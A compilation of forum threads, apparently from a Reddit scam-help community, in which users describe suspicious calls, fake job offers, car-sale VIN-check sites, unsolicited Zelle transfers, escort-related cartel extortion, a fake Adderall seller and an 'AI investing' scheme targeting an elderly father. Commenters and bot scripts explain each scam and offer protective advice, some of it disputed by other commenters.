- Yes, scam. Block all numbers and ignore it. Someone got your contact information and is looking to shock you into some bogus payment.
- Law enforcement won‚Äôt do anything unless there was an injury. It‚Äôs. Scam.
- I've heard of very similar scams here. It's the kind of scam where they try to intimidate you into giving them money. They're hoping you get so panicked by the thought of visits from the police and lawsuits that you just agree to whatever they want to get them to go away.

In the future, if you don't recognize a number, it's best to just let them leave a message to avoid these kinds of things. If it's someone you want to talk to, you can always call them right back.
- Possibly somebody hit his car, and left a note with your name and number.  Or it could be a scam, as others have explained.
- It's a stupid prank. I know someone who paid to have this done to multiple people in our circle, including myself. They record the victims reaction so the person who paid for the prank can listen to it.
- Of course!
- Unless you gave the person your number after the accident how would they know your number
- Sadly, even mainstream news and consumer protection agencies have chimed in and (misleadingly) given credence to the possibility that this could happen.

Title: Cedar Finance calls claiming I have money left on an account or that i can claim
Body: I‚Äôm hoping some of you can help me figure out what‚Äôs going on. About 10 years ago, when I was still a kid, I used Cedar Finance to trade binary options more or less blindly. Somehow I managed to make $3,000‚Äì$4,000, withdrew my winnings, and never used the platform again.

Starting around three or four years ago, I began receiving phone calls from various people/companies claiming either:

1. I still have money left in my old Cedar Finance account, or
2. Cedar Finance was involved in something shady/illegal, and I‚Äôm entitled to a refund or compensation.

They keep insisting that I go to another website, upload identification documents, and verify my identity to claim these funds. They do know my name, phone number, and email too. 

**What‚Äôs confusing is that I never lost money with Cedar Finance (I actually withdrew my profits back then), so I‚Äôm not sure why they‚Äôre so persistent.** Every 6 months-ish I receive a call like this. 

Is there‚Äôs any chance it‚Äôs legitimate, or is this definitely a scam? It smells like some kind of pig butchering scam maybe. I‚Äôd appreciate any advice or insight from people who have dealt with similar situations. Thank you!

- If this is un the USA, and if the account has been dormant for that long and had any assets, they are supposed to be *escheated* to the state.  You can find your state's lost property page by visiting your state's official web page and search.  Check if there is unclaimed property under your name and file a claim for it there.    Do not use any other random website to get lost property.

If you end up talking to them, tell them you will only check with your state's unclaimed property for old unclaimed property.
- Have you done a whois search on the domain to see if the site is real and how long it's been around?  That would be my first step.  Scam sites are often only a few months old, sometimes a few days old.

- Nope, it's the standard vehicle history report scam.

The scammers also own that website. Either they'll take your money and give you a bogus report, or they'll just straight up steal your CC info.
- Sounds like a !car scam. The domain only came into existence back in September of last year

!whois visionwheelz.com

- carfax only. don't overthink it. that's all you should ever provide, period.
- You are selling the car, you set the terms for the deal. You do not need to inspect your car with any website you aren‚Äôt familiar with and do not need to pay any money for anything, you‚Äôre trying to make money not spend it. Just say no.
- https://www.youtube.com/watch?v=WHLfO_pu7q4
- Luckily these scams are extremely easy to spot: **Any time** you're asked to run a check for a vehicle you're selling, at a site specified by the buyer, it's a scam. Just block them and wait for a genuine buyer. VIN checks etc. are the buyer's responsibility.
- Hi /u/Applauce, AutoModerator has been summoned to explain the Car sales scam.

If you're buying a car, a scammer will list a car on a marketplace site and will ask you to email them. They will tell you that they will ship or otherwise transport the car to you and allow you to inspect it. They may use the name of a company like eBay or Amazon to make the scam sound more legitimate. The scam is that the car does not exist, despite whatever pictures you have received, and you will be asked to pay for the car using gift cards, crypto or irreversible wire transfers..

If the seller is real and wants to actually meet, you may face a different type of scam (which involves a run down, stolen or otherwise bad deal of a car). To prevent this, you need to meet at a mechanic's shop you trust and have a full inspection of the vehicle. Remember all sales are final when dealing with used cars. The seller needs to come to meet you, so as mentioned above, the offer for a courier doesn't help.

If you're selling a car, the scammer will try to have you pay for a verification on a scam website, some VIN check lookup or certificate of records of some sort. Remember you're the seller, you set the terms. If you want to provide some certification, use a website you trust. They can do their own verification if they don't trust yours. And also, they can try to pull a fake check on you. No buyer is sending a courier to pick up a car they haven't seen.

And again, if the buyer is real and you actually sold the car, the same rule applies: all sales are final, so do the proper paperwork, consult a subreddit dedicated to car sales and make sure the transfer is completed.

- Probably an invitation to launder money.  I'd run.
- {REMOTE IN BRACKETS} or "remote" in the job title is scammerese for "We think you would fall for anything if we say it's work from home."
- Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, Telegram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (check is fake, you lose money)

- job involves re-shipping packages (parcel mule)

If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.
- 2-3 hours 3 days a week would be 6-9 hours for $375/week or $42-$63/hour

Nobody is paying that much for a bookkeeper role, especially full-remote.
- Or could be !fakecheck if they want you to buy equipment/software for the job
- Scam
They send you fake checks, you deposit then, and send your money to them
- Please format your post better. It reads like you are the scammer posting the message.
- I figured something probably off, much appreciated!
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/onlymodestdreams, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Dispute the transactions and, this is very important, tell the bank to stop recurring charges from that account. They may advise to get a new credit card altogether. In this case if you get a Visa make sure the merchant continuity program is wiped clean, otherwise you may get more charges.

Title: the dreaded zelle scam
Body: Exactly two weeks ago I was sent $100 through Zelle from an unknown person, did the research, knew it was a scam, and ignored it. I meant to call my bank but things have been incredibly hectic this month so I never have time to call my bank during the hours their customer service is open. Fast foward to today, I get sent $70 from the same person and this blatantly scammy text. 
I won't have time to call my bank during their hours of operation until Saturday. Should I just ignore it altogether? I'm worried that if I call my bank they'll think it's weird that I didn't contact them immediately and then I'd get in some sort of trouble idk. I'm a very paranoid person so forgive me if that's a dumb thing to worry about but I'm just not sure what the best route moving forward would be.

- Block and ignore them. The bank will sort it out.
- [removed]
- Ignore it. They're usually sent from hacked accounts.  The moment you give them back the money,  the bank sorts it out,  you'll be out. 

ALWAYS REMEMBER THERE IS NO SUCH THING AS FREE MONEY.
- Just ignore it. 

Zelle has a no-takes-backsy policy. That is your money now and screw them. Of course it will be clawed back when the original account owner discovers the fraud.
- I dont speak english except for this sentence.
- Don't worry about what the bank thinks. Give them a ring. You've done nothing wrong. Just get them on board to solve this. It's good that you already recognize that you are paranoid, so I don't have to tell you that you are.

In reality, there's not much for you to do anyway, but a short call to at least let them know what happened can't hurt. And if they take that money - no biggie. It's not yours.

Just be sure to keep that $170 extra in the account until the bank withdraws it.
- Bottom of the screen. Report junk. Lol
- I would just write back in the same way. ‚ÄúHello my friend. Right number greetings to you! Hello! Regard!‚Äù And it should eventually resolve it self when you just write similar nonsense back
- You can check you number lol wth
- Just say thanks.

- Will do, thanks
- Zelle isn't an app,  it's an interaccount transfer system. Sending money via Zelle is effectively doing an account transfer through your bank to someone else's account. It's no different than handing someone cash and then blaming the ATM for getting scammed
- Geeze. I use it to send money amongst family and a couple of friends. Perfectly fine for that. 

For commerce of any kind whatsoever? Big nope.
- I‚Äôve received thousands through Zelle; I‚Äôm not a scammer and neither are the people that have sent me money. Anything can be turned into a scam. Checks, cash, card, banks, retail stores, car dealers, literally anything involving money.
- But if they zelled u the money it can‚Äôt be clawed back. A check can bounce, Zelle is final. That money is yours it‚Äôs their mistake don‚Äôt send it back
- This. I understand that it can be scary to be able to click some buttons on your phone and permanently send money to someone, but in the end, that‚Äôs what personal responsibility is.
- This is false, in case of fraud it can be reversed. Not when you send it yourself though.

Title: Messaged escorts and now MS-13 Gang Threats. Is this a scam?
Body: I messaged some escorts earlier this week about their services and what they like and didn't end up making a booking. The next day I received a message from a guy claiming he was from MS-13 and that my family was their main target & there will be no mercy. He said I needed to pay a fine of $2000 through PayPal but PayPal didn't work for me and then I tried Remitly and that didn't work but Western Union finally worked. As I made some errors I was ordered to pay more fines and now the fines are up to $4000 and I've now paid $20,000 via PayPal & Western Union to a few different people in the US & Domician Republic. This has been going on for 4 days now. They have my photo, name & address and I'm scared for my family's safety. Is this a scam?

- Yes, it's a common !cartel scam.

And plot twist: you weren't texting with escorts, you were texting with the scammer. The escort website exists purely as step one of the scam: to set you up for the threatening messages and make you scared because you think you actually did talk to an escort prior to that and it then "makes sense". But it doesn't; the entire thing is a scam.
- It's a scam. You're unnecessarily sending your money to a guy on the opposite side of the world who's about as intimidating as a 112 year old Grandma.
- Delete, block, and ignore. There is no danger here and no threat. Do not send any more money. Do. Not. Send. Money. 

Your money is gone. Don't send more. Cut your losses and spend some time reading about scams on this sub so that you are less vulnerable in future.
- Is there anyone in your life you trust? You really need to let someone know that you fell for this scam and you have lost so much money on it. Someone may need to keep an eye on you when it comes to your finances and your internet access. I‚Äôm so sorry you went through this and I hope you have a good support person.
- Yup‚Ä¶ it‚Äôs a scam. There never was a prostitute. There never was the ‚Äú!cartel‚Äù‚Ä¶ you have been talking with a bunch of 20-something Nigerian scammers the whole time and they are laughing as you tremble in fear and send them thousands of dollars.

Please stop sending them money. You are in no danger whatsoever.

Your name, address and family members can be found via a Google search of your phone number.
- Not only is this a scam but MS-13 is on the run from ICE these days.
- Well the good news is that you and your family are safe.  The bad news is that you were scammed.  You weren't exchanging messages with an escort... that was the scammer.   You weren't exchanging messages with anyone connected to gangs... that was the same scammer.

Stop now.
- Congratulations, you've paid $20,000 to some guy sitting behind a computer in India where the average yearly salary is less than $5,000.
- Post #376 this week of horny dudes trying to hookup with random women online.

Trying to find escorts online is as dumb as looking up "Live RPG-7 For Sale" on google.

All of those "escorts" websites are all scams along with the magic mushroom, weed, xanax sale sites.

You dont buy that stuff online unless you want to be scammed.  Those are in person transactions. 

Life tip. ZERO girls will ever ask you for a picture of your willy. Your girlfriend/wife wont ask you to send them a pic of your dingaling. If someone asks you for a picture of your fire hose, they're a scammer.
- Would it be worth changing my phone number & bank card too?
- These scammers prey on your fear and embarrassment. That's why you were willing to pay them. Please stop. If you fear for your family, go to the police.
- Block them, don't pay them any more. It's a new scam for you, but it's a common scam, reported here every day. It's scary, but it's all lies. If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

Looking for an escort is not shameful. The problem is that most of those sites are scams, they take a little bit of info that you give them and threaten you to try to make money. They want your money, nothing else. If you stop paying, they will eventually stop bothering you. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't messaging you; the escort extortion is actually run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.

- He's South American. I  talked to him on the phone for 10 seconds on the 1st day.
- Sure thing. As noted in the AutoModerator I called, all you need to do is ignore them. Just block/ghost them. Don't respond at all. They will give up eventually. They are running this scam on dozens or hundreds of people at a time, but focus in on the ones who are replying and seem scared, because those are the people most likely to give them money.

Edit: upon a second read, I see that you already sent them some money. Because of that, you are going to sit at the top of their list to keep trying for a long time, because you've already proven that you're willing to send the money.  So it will be a longer period of blocking and ghosting before they eventually give up and move on. But be assured, there is no risk to you. It's likely that, for this particular scam, the scammer is in an internet cafe in Africa just trying this scam all day everyday.
- Block them, there is no cartel, they‚Äôre not real. Your name and address are public info
- It doesn't matter. It's very easy for scammers to look like they're calling from any number they want. I've recieved a call from my own phone number before.

  
All you have to do is stop paying them, stop talking to them, and block tyhem every time they reach out. They'll go away. You aren't in any danger, no matter what they say, but the money you gave them is all gone for good. Nobody can help you get it back.
- What about the family the scammer pretended to target?
- [removed]
- Fingers crossed they give up soon. I feel sick for falling into this trap. 

Yeah, Have already sent multiple payment amounting up to $20,000. The guy always replies quickly & his number is from the same country as mine. Have talked to him on the phone for 10 seconds and he sounds South American and MS-13 started in North America/South America.
- I've even tried to setup a VPN and trace their number but you need to pay on most of those sites to get any decent info.

I haven't slept at all for the last 4 days & am starting to feel sick.
- I also even spoke to the guy on the phone for 10 seconds and he sounds like he's South American.
- I will talk to my brother later this afternoon. Don't want to scare my mum. Is it worth going to the police?

- Of course he replies quickly, you are worth big bucks to these guys since you've actually started paying them.
- His number is probably spoofed (software is used to make the displayed phone number look like another number, in your city or country, when they are really calling from a different country).

MS-13 is not threatening you, that's part of the scam to scare you. Usually they say Sinaloa cartel. For Europeans, they pretend to be Albanian mafia.
- Again, all you have to do is cut off contact with them. They're likely halfway around the world. Don't worry about trying to trace them. Just move on with your life and try to learn from this experience. 

This scam gets posted here on a daily basis. Nobody had every been actually put in danger.
- No. It‚Äôs not real. It‚Äôs a complete stranger in some random country, who set up a profile on whatever app/website you used, to target people looking for escorts. Even the number they‚Äôre contacting you on isn‚Äôt real.

They have your information or pictures because it‚Äôs readily available on Google by searching whatever information you gave to them. Super easy to find and publicly available.

What‚Äôs a member of an international crime gang doing going after lonely guys on the internet? And why on earth would they implicate their entire gang in their small time cons?
- I‚Äôm not going to sugarcoat this and say it will be easy reporting this to the police. Talking to the police would involve explaining that you tried to solicit sex and I don‚Äôt know if that is an illegal act where you live. You have to consider that. The police can‚Äôt actually catch your scammer but if you do talk to them to report this maybe they will have advice about other scams you should watch out for. They may also explain why it‚Äôs silly to think MS-13 would have actually gone after you for something like this but they don‚Äôt have to kind about how they explain it. It may make you feel worse.
- Escorts are legal where I am. I'm considering talking to the police but still having 2nd thoughts about that. Do you think going to the police will make it worse?

Title: Tried to get my adderall script for cheaper (i know, it was dumb)
Body: So as I mentioned, I take adderall and I just was trying to save the hassle of going in once a month to pick it up and instead get it in bulk for cheaper. This place offered some to me and I hate myself for thinking this was a good idea. Anyway, they've asked me for money to cover up and make the package shipping discreet, and to allow it to go through customs unchecked because it's technically drugs. I didn't even think about it that way. They have my name and number and address, and are telling me I could get myself arrested if the package doesn't get even more discreet coverage to pass through more customs and gets opened up and gone through. I'm so terrified they can actually get me in trouble for attempting "drug smuggling" or something because as I said, they do have my name and address and I don't want to get arrested obviously üò≠ but I don't have hundreds upon hundreds of dollars to keep giving these people that im pretty sure are scamming me anyway. What do I do?!!

- There is no package.  There never was gonna be any package.  They are just wringing you dry.
- >hassle of going in once a month

Doesn't look like such a hassle anymore, does it?
- Cut off and block all contact. Do not send another penny. There were never any drugs, just a scammer.

Do not try to buy drugs online again, you will just get scammed. Adderall is a Schedule II drug, so it's just going to be inconvenient to get prescriptions for that filled. Do not try to buy it anywhere other than a real, in-person pharmacy.
- For anyone else out there, Adderall is a controlled substance. The "hassle" of only getting a month supply at a time is fully intentional and strictly regulated. Anyone offering to get you Adderall in bulk is straight up making a drug deal with you, with all that entails (major legal issues, tainted drugs, and scams included).
- Stop paying. Ignore them.
- If you paid using a credit card, you can file a chargeback. If you paid using crypto, it‚Äôs gone‚Ä¶ :(
- You broke the law and got scammed while doing so.
- Yep very common scam!
- I feel so stupid and hate that I made this mistake. I wish I hadn't have tried it in the first place. I tried to back out but was hard to when being told I'd be responsible when the package is checked and drugs were found üò≠
- Not at allüò≠
- I definitely learned my lesson üòî
- A credit card to buy highly illegal prescription meds? Hope not.
- I know, I asked to have them take credit card but they said they couldn't take it. I wanted to quit paying them weeks ago but I was so scared to get arrested üò≠
- That's why I'm so scared and ashamed. I don't know how to avoid getting in legal trouble if it arises...it was so stupid of me
- Water under the bridge. The best thing you can do is block and ignore it, and put the whole thing behind you. No need to make yourself more miserable about this. 

Honestly, the cost of medications in the US is a huge problem for many of us. So many Americans were buying their meds in Canada that the Canadian government had to pass laws prohibiting sales to noncitizens. It's not crazy that you tried to do an end run around the problem, but it was a scam and now you just need to shut the door on it, clear your head, and move on.
- If they were shipping prescription drugs across borders illegally they would have just as much motivation for the package to be discreet. If they were to get caught the consequences for running an operation like that are far worse than for being a one time customer.

But there was no Adderall. Good luck getting your meds, I take stuff for ADHD too and it's a nightmare getting it filling almost every month so I understand why you'd resort to this.
- Only exception: if you have prescription drug coverage you *may* have the option of ordering a three month supply at a time. Your doc has to write a 90-day script and the (legit) mail order pharmacy will probably ship it so you have to sign for it
- I don't think that law enforcement in your country will be interested in you. They are busy chasing big drug dealers. Also, they have nothing to charge you with -- you tried to order something, it never arrived. But if you're still worried, post a question in the legal advice sub.
- Not Adderall. That‚Äôs a highly controlled substance. The OP was lucky to get it at all.
- Thanks!
- I've been getting Concerta (also schedule II) mail order for 20 years (ETA and Adderall periodically subbed in when Concerta not available)
- I have the option for mail order through my insurance and I take a few Schedule II drugs. I know I could get them filled that way, but I believe it's limited to a 30-day supply, unlike other meds. 

I refuse to get mail order through my insurance though because I've involuntarily had to go off of my meds when they didn't show up one too many times.
- I definitely have been not been limited to 30-day mail order on Concerta. I would not use mail order for anything that couldn't be stopped abruptly

Title: Is my dad being scammed?
Body: My dad is in his 70s, not technologically advanced but desperate to make money, very into penny stock investing, yesterday called me and told me he invested $500 in something to do with AI through a company called wealth fidelity and he was called by a man from the uk using a Manitoba number to tell him that his investment turned into $10000. I‚Äôm sketched out but I don‚Äôt live in the same city as him so I can‚Äôt see everything he‚Äôs doing and he‚Äôs not doing a good job of explaining anything to me. This is a screenshot from what he calls the company website. I can‚Äôt even click on privacy policy and terms. The number he‚Äôs getting called from is 1(204)816-2952. Can anyone help me? I don‚Äôt know what questions to ask to find out if this is legit or not but I‚Äôm feeling sick to my stomach over this. The guy asked him what his goals are with his money and my dad said he wants to retire my mom. I just feel like he‚Äôs saying all the right things to entice my vulnerable dad.

Comments:
- So was he contacted out of the blue to invest? Sounds similar to !crypto scams. And that money he‚Äôs ‚Äúinvested‚Äù is surely gone by now
- If it's legit, you'd have no problem finding this guy or his company. Also, if this guy could turn $500 into $10000 so easily, he wouldn't need your dad's money.

100% a scam.
- Almost certainly. Your dad will be encouraged to deposit more money to increase his profits. Or he'll attempt to withdraw and be told that he has to pay fees for withdrawal, AML checks, commission, fees etc etc.
- !whois fwealthm.com
- "With AI"¬† yup, that money is gone.¬† The pictures of the number going up are just pictures.
- Almost certanly a scam
- There are so many things to say here, but here's the most important bit:

If these guys could turn 500 bucks to 10k, they wouldn't call your dad to invest, they would just do it multiple times and turn their own 500 to 10k to 200k to 4M to 80M to 1.6B to 32B and finally that would be turned to 640B USD. Congrats, in mere 7 steps, you officially became the richest man on earth. 

I'm sorry your dad got scammed, OP.
- [deleted]
- Freeze all his accounts!
- Keep an eye on your dad now. Once he realizes he has been scammed he might try to recover the money and there are many scams that are targeted for that situation. The original guys might "let him withdraw his money" if he pays some fees. Or there might be "experts" that contact him to "help him".   
If he does not accept that the money is gone for good he will continue to be in trouble since every step to "recover" the money is probably going to cost him more and more.
- Yes he is, I fell for this scam cut all contacts with them and move on, forget about the money and save yourself move on
- Yes. ‚ÄúAI investing‚Äù cold call is 1000% a scam. 

DO NOT let him get involved with this. They will take EVERYTHING.
- They will take his money, 'show' gains, allow 1 withdraw, encourage continued investment, never let him withdraw again, and likely have fake requirements around investment or unlocking profits, in order to withdraw. Withdraws will never come, all gains were fake.
- Yes, this is a very common scam. Where they tell/show you you're making money, but it's all fake and designed to get you to "invest" more. If he ever tries to take the money out they will find excuses or "fees" to not allow him to get anything out. 

The money is gone and so will anything else he "invests". My dad also liked Penny stocks and long shots. He was scammed repeatedly and ended up losing repeatedly-- his quest for quick cash could send him into bankruptcy.
- Yeah, if somebody called to say that his $500 turned into $10000 its 100% a scam. They're gonna start asking for more money and then when he wants to pull his money out, start charging fees and taxes that need to be paid up front.

Do something now before its too late. You don't want him to have to start over at 70.
- Yes
- Common pig slaughtering execution. They gain your trust then link you to fake crypto or other investment websites, it‚Äôs never like ‚Äúbuy x coin‚Äù that you can look into and invest on safe platforms, it‚Äôs always some sketchy website or app. It‚Äôs all a set up to take the money. Sometimes it‚Äôll have fake growth charts that make it seem like your money is going up, but you can‚Äôt pull it out.
- If your dad doesn't believe he fell for this and thinks he has 10000, tell him to make a withdrawal to see what will happen. If it lets him withdrawal anything at all, have him do it a second time. This is when they will be asking for transaction fees or misc fees in order to withdrawal more.


I would just go with the first $500 withdrawal to try and get his "investment" back and see what they say.
- I‚Äôm sorry your dad is in a delusional state. Many never recover and loose everything. These scams are especially sinister. Rip the modem out. Cancel on-line activation. You must get your dad off the internet. If you can‚Äôt, kiss it all goodbye and walk away. Don‚Äôt be intimidated- these are ‚Äúprofessional‚Äù scammers! Ask your dad to ‚Äútake out‚Äù $10k to payoff something- bills. He won‚Äôt be allowed to. Buy some time - appeal to his adult - buy the Wallstreet Newspaper and show him what the real world is all about!
- It's clearly a scam. There is no investment and your dad won't be able to withdraw funds....they'll just say he need to pay some fee/upgrade the account/pay tax etc until he finally stops sending money to the scam group.
- [deleted]
- Next time, tell your dad to run things by you.
- The UK is a +44 code and I strongly advise he doesn‚Äôt give them any info.
- Be very careful
- Report this also to fidelity. Maybe email them and get someone there to respond with a "yes this is 100% a scam" and show that to your father.   
Also contact his bank and have someone there tell him this. Or if you have friends in investment have them call/message your father.   
Basically try to get as much authority behind your claims as you can. Your word is not enough for him and he believes he is talking to "the best investors" so you need to battle that with even more authority.

  
Don't give up man!!
- Tell the guy who called him to send the money. One and done.
- [deleted]
- Yes looks like a pyramid or Ponzi investment or crypto scam. When in doubt assume it is a scam.
- The best thing your father can do is get his money back (maybe a little more, maybe a little less). It IS possible.

You see, these scammers are greedy. They want the big fish. So if your father talks to them in a way that convinces them that letting him take out a little will prove their legitimacy to him, and that he will invest more once that is proven - they just might give some/all/more back. 

"Hi, this is going great and I'd like to invest more. My friend does too! But he told me that I shouldn't invest any more until I know that I can safely withdraw. So I'd like to withdraw $600."

Something like that.
- Possible scam:

- this is something called spamming, they make a fake website and its called a spam page and have sms numbers where they send out a prompt with the site they just made but it is almost identical to the real one but very easy to tell its not the right domain that matches the real site. Also you will always be able to tell that it comes from a real number.
- Let me get on my VPN and VM, and check this....NVM, I know Fidelity  really good, first I use have a account there, and yes this is a scam website, not really Fidelity.  Fidelity does have wealth mang, but it's under Fidelity. Not this cheap crap website.
- Hi /u/mrrjuann, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Thank you so much! I think this is what I needed.
- I mentioned this above, but it bears repeating, some of these scams will allow you to withdraw money the first time you try. It builds trust, and destroys the credibility of any friends/family trying to convince the victim it‚Äôs a scam. 

Sadly, it‚Äôs totally worth it for these scumbags to allow withdrawals since they are going for (and often get) big, big, money out of their victims.
- They even list the address of an actual Fidelity office in Boston on one of their pages, so Fidelity should definitely take this scam site seriously. 

It's crazy to me how people can go from a wrong number text to handing over thousands of dollars to some rando online in just a few easy steps.
- The official sub is r/fidelityinvestments, not r/Fidelity. FYI.
- I don‚Äôt know what to do. This scammer has him. 1000% convinced that it‚Äôs legit. He just got finished telling me he wished he had kept this to himself and that he‚Äôs so proud of the investing he‚Äôs done. I don‚Äôt know what else I can do. He‚Äôs a stubborn man.

- He‚Äôs a very proud stubborn man. The only reason I know about it is because he called me bragging about how he‚Äôs gonna be able to retire my mom and how he wishes my siblings invested in the things he told us about. This situation is getting more and more frustrating. Now he‚Äôs at a store buying a laptop because he says he can‚Äôt check his credit card statements from him phone. This man does not need a laptop. He‚Äôs retired and my mom is still working. She‚Äôs gonna come home and blow up on him for spending money they don‚Äôt have on this stuff.
- I actually posted this to fidelity‚Äôs Reddit and got a response verifying that it is a scam. My brother went over to my dads place to talk to him and told him everything I‚Äôve learned but he refuses to listen. I sent a message to the mods of the fidelity Reddit and I‚Äôm hoping they‚Äôll get back to me and agree to call him. I don‚Äôt know how he could continue to believe the scam after that.
- These scams are so profitable, a lot of them will let you withdraw a nominal amount (I‚Äôve seen as much as $1,000) in order to build trust. It is NOT a good idea to tell someone who is a potential victim that ‚Äútry and withdraw money‚Äù is the way to tell if it‚Äôs a scam. 

When you make an ultimatum like that and it turns out to be wrong, you‚Äôll have an even harder time convincing the victim that they are involved in a scam. Most of the time it will permanently destroy your credibility with them.
- Just got off the phone with him and he‚Äôs totally convinced it‚Äôs legit. He told me he wishes he never told me and that he‚Äôs proud of the investments he‚Äôs made
- Nothing possible about it. Anyone talking to you about about ‚ÄúAI investing‚Äù on the internet is a scam. Period.
- It's a scam. Immediately tell your father to not put any more money. The $500 is lost. Th app is fake, site is fake, the $10k is fake and a ruse to get him to put more money in. When he tries to withdraw they will say they need more money as a security deposit for processing fees or something and make him put more money in. This is a fake trading/investing scam. People's life savings get taken away. Your father needs to stop NOW. If he says no and that he knows and trusts the person who is guiding him to invest money, tell him that person is fake. It is probably a woman who he thinks is real but it isn't. These scams are run out of scam call centers in Dubai, Cambodia and many parts of Asia. They employ real women to facetime victims to convince them that they are real. On the pretext of friendship and romance they pig butcher them of their money through these apps.
- It was probably a !wrongnumber from a pretty Asian girl and he's too embarrassed to admit it.
- Sounds like a variation of the pig butchering scam.
- The contact info ain‚Äôt a concern. The goal of the scammers is to get your Dad to wire all his money to them. They will talk to him and use their techniques to get him to send out his money. This is a con and they are practiced at it and good at it.
- But you can send it away with a wire and its gone.
- He‚Äôs in for a world of financial trouble if he continues down this road. Millions of get-rich-quick scams. None of them legit. The social engineering is brilliant, and enough to fool more people than are willing to admit
- Good bot
- Yeah, because it instills so much trust, they know the victim will immediately 'reinvest' the money.  Very few people will actually depart with this withdrawal.
- [removed]
- [deleted]
- This is what I would do. Go to him face to face with a bunch of money in cash, like 5k (if possible) and tell him that "this money is yours right now if you can withdraw that money from "your investment account"". The reason people don't withdraw is because there would be a "loss" and the people on the phone will say pretty horrible things and make him feel like an idiot if he tries. But if you eliminate the loss by giving him this money he might try to get his money. And then he MIGHT wake up when he realizes that the people push back like crazy and won't give him his money no matter what.

The next step is usually that the victim starts to borrow money from other people. They need to pay some fees or else they will lose their investment. So they panic and start putting in more and more. And then they "make a mistake" and it's their fault that everything gets very complicated.

Talk to him face to face and say that you love them but you won't be quiet even though he is getting angry. Ask him to just please please do this for you if not for anything else. To take ALL OF THE MONEY HE PUT IN out of there. After that he can do what he likes, put it back in or burn it, whatever. Just to prove that this is true. 

Do not be quiet just because it is embarrassing and don't let him off easy. But do remind him that you are only "being difficult" because you care about him. And if an argument means there is even a 5% chance to save him you are willing to take the risk.

Also call his bank? Report a suspected fraud.

You could also talk to him about his plan b. Like okay, it's your money and unfortunately you can burn it all this way. But please could we talk about what your life will look like after this. Let's say you never see a penny of it. Can you afford to keep your house? How much money or assets would you still have to your name? Can you right now afford all your payments and loans without the money in your investment? I love you and just want to know you have food and a roof over your head even when all of this goes bad, because i KNOW that this money is gone forever.
- Your dad has got to understand that logically, there is NO WAY to flip that amount of money into that type of return, and it is legit and legal.
If it was, everyone would be doing it.
Any type of legitimate investing takes time.
ALL types of legitimate investing with websites will have, at minimum, clickable T&C. 
Tell your dad that you want to be proud of him as well and fear this is someone who is out to harm him... but you'd be happy in trying to help him find a proper REAL investment strategy.

